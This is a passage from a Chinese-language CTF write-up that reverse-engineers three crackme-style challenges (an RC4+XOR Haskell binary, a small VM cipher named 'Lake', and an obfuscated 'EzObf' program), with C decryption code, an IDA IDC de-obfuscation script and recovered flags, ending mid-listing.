<p><img src="/.%5C29.png" loading="lazy"></p>
<p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p>
<p><img src="/.%5C30.png" loading="lazy"></p>
<p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p>
<p><img src="/.%5C32.png" loading="lazy"></p>
<p><img src="/.%5C33.png" loading="lazy"></p>
<p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p>
<p><img src="/.%5C34.png" loading="lazy"></p>
<p><img src="/.%5C35.png" loading="lazy"></p>
<p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p>
<h3 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h3><p>单步跟到主函数。</p>
<p><img src="/.%5C36.png" loading="lazy"></p>
<p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p>
<p><img src="/.%5C37.png" loading="lazy"></p>
<p>然后接着第二次加密，最后循环比较。</p>
<p><img src="/.%5C38.png" loading="lazy"></p>
<p><img src="/.%5C39.png" loading="lazy"></p>
<p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p>
<p><img src="/.%5C40.png" loading="lazy"></p>
<p><img src="/.%5C41.png" loading="lazy"></p>
<p><img src="/.%5C42.png" loading="lazy"></p>
<p>调试输出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br></pre></td></tr></table></figure>

<p>这也就是第一层加密的解密代码。</p>
<p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p>
<p>完整解密代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp, data, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> base = <span class="number">4</span> * i;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            block[<span class="number">0</span>] = ((temp[base + <span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">1</span>] = (temp[base] &gt;&gt; <span class="number">3</span>) | ((temp[base + <span class="number">3</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">            block[<span class="number">2</span>] = ((temp[base] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">3</span>] = ((temp[base + <span class="number">1</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> &amp;&amp; base + j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[base + j] = block[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Input[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">0x4A</span>, <span class="number">0xAB</span>, <span class="number">0x9B</span>, <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0xB1</span>, <span class="number">0xF3</span>, <span class="number">0x32</span>, <span class="number">0xD1</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span class="number">0x22</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x23</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xFB</span>, <span class="number">0x25</span>, <span class="number">0xC2</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0x22</span>, <span class="number">0xFA</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>, <span class="number">0x49</span>, <span class="number">0x97</span>, <span class="number">0x87</span>, <span class="number">0xDB</span>, <span class="number">0x51</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt_func</span>(Input, <span class="number">40</span>);</span><br><span class="line">    Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">    Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">    Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">    Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">    Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">    Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.40s\n&quot;</span>, Input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -&gt; flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p>
<h3 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h3><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p>
<p>混淆流程：</p>
<ol>
<li>执行真实指令</li>
<li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li>
<li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li>
</ol>
<p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p>
<p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p>
<p><img src="/.%5C43.png" loading="lazy"></p>
<p>deobf idc脚本：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">NopCode</span><span class="params">(Addr, Length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(Addr + i, <span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">rol</span><span class="params">(value, count, bits = <span class="number">32</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    count = count % bits;</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; count) | (value &gt;&gt; (bits - count))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索真实汇编代码的下一个地址</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindEnd</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0x5153509C</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索最后的jmp rax指令</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindJmpRax</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Word</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE0FF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索call $+5</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindCall</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> StartAddr = <span class="number">0x1401F400D</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 搜索真实汇编代码的下一个指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> EndAddr = <span class="built_in">FindEnd</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (EndAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 真实汇编代码的字节长度</span></span><br><span class="line">        <span class="keyword">auto</span> CodeLength = EndAddr - addr - <span class="number">13</span>;</span><br><span class="line">        <span class="comment">// 搜索Call $+5</span></span><br><span class="line">        <span class="keyword">auto</span> CallAddr = <span class="built_in">FindCall</span>(addr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="keyword">if</span> (CallAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// call $+5的下一条指令地址，即call时push到栈的返回地址</span></span><br><span class="line">        <span class="keyword">auto</span> CalcAddr = CallAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">auto</span> ebx = <span class="built_in">Dword</span>(CalcAddr + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">auto</span> rol_Value = <span class="built_in">Byte</span>(CalcAddr + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">auto</span> Mode = <span class="built_in">Dword</span>(CalcAddr + <span class="number">9</span>);</span><br><span class="line">        ebx = <span class="built_in">rol</span>(ebx, rol_Value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 搜索最尾部的jmp rax指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpRaxAddr = <span class="built_in">FindJmpRax</span>(addr);</span><br><span class="line">        <span class="keyword">if</span> (JmpRaxAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第一部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_1 = CallAddr - (addr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="comment">// 第二部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_2 = JmpRaxAddr - CallAddr + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// Nop掉无用的所有代码</span></span><br><span class="line">        <span class="built_in">NopCode</span>(CallAddr, TrushCodeLength_2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(addr, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(addr + <span class="number">13</span> + CodeLength, TrushCodeLength_1);</span><br><span class="line">        <span class="comment">// 一共两种地址计算，加和减</span></span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC32B48</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr - ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC30348</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr + ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> JmpCodeAddr = EndAddr;</span><br><span class="line">        <span class="comment">// 计算相对跳转地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpOffset = CalcAddr - JmpCodeAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="comment">// 写入jmp指令</span></span><br><span class="line">        <span class="built_in">PatchByte</span>(JmpCodeAddr, <span class="number">0xE9</span>);</span><br><span class="line">        <span class="built_in">PatchDword</span>(JmpCodeAddr + <span class="number">1</span>, JmpOffset);</span><br><span class="line">        <span class="comment">// jmp的地址为下一次deobf起始地址</span></span><br><span class="line">        addr = CalcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行完，把main_0剩余代码都手动nop即可。</p>
<p><img src="/.%5C44.png" loading="lazy"></p>
<p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p>
<p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p>
<p><img src="/.%5C45.png" loading="lazy"></p>
<p><img src="/.%5C46.png" loading="lazy"></p>
<p>Main函数原代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> 